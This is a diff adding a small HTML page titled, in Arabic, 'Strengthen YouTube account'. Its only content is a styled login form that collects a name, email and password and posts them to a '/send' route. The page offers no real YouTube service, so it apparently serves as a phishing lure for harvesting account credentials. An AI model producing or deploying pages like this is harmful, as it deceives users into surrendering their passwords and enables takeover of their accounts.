@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تقوية حساب يوتيوب</title>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+        }
+        body{
+            background-color: #000;
+        }
+        form{
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%,-50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #000;
+            border-radius: 30px;
+            padding: 30px;
+            box-shadow: 1px 1px 10px 0 #fff;
+        }
+        form input{
+            width: 100%;
+            padding: 10px;
+            outline: none;
+            border: none;
+            background-color: #002;
+            color: #fff;
+            border-radius: 20px;
+            margin: 3px;    
+        }
+        form input[type="submit"]{
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <form action="/send" method="post">
+        <input type="text" name="name" placeholder="Your Name">
+        <input type="email" name="email" placeholder="Your Email">
+        <input type="password" name="password" placeholder="Your Password">
+        <input type="submit" value="login">
+    </form>
+</body>
+</html>
